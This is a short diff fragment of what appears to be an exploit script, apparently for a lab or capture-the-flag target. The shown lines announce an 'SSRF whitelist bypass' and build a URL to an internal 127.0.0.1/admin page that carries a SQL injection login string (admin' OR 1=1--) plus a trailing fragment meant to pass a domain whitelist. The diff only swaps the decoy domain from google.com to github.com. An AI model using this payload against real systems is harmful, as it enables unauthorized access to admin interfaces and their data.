@@ -21,7 +21,7 @@ curl -s -L \
   >/dev/null
 
 echo "[*] SSRF whitelist bypass -> internal /admin with SQLi"
-BYPASS_URL="http://127.0.0.1/admin/?login=admin%27%20OR%201%3D1--%20&password=any#google.com"
+BYPASS_URL="http://127.0.0.1/admin/?login=admin%27%20OR%201%3D1--%20&password=any#github.com"
 
 response="$(curl -s \
   -b "$COOKIE_JAR" \
